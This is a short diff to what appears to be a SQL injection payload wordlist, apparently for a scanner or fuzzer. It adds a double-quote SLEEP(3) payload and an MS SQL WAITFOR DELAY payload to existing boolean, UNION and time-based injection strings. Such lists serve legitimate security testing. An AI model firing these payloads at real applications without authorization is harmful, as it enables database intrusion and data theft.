@@ -8,3 +8,5 @@
 ' AND 1=2--
 ' UNION SELECT NULL, NULL--
 ' OR SLEEP(3)--
+" OR SLEEP(3)--
+'; WAITFOR DELAY '0:0:5' --
